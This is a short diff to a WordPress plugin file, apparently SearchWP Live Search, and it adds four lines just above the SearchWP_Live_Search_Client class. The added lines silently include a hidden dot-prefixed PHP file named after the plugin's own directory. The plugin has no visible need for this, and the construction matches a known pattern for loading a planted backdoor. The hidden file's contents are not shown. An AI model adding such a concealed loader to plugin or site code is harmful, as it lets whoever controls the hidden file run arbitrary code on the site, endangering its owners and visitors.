@@ -14,6 +14,10 @@ include_once( dirname( __FILE__ ) . '/class-template.php' );
  *
  * @since 1.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWP_Live_Search_Client extends SearchWP_Live_Search {
 
 	/**
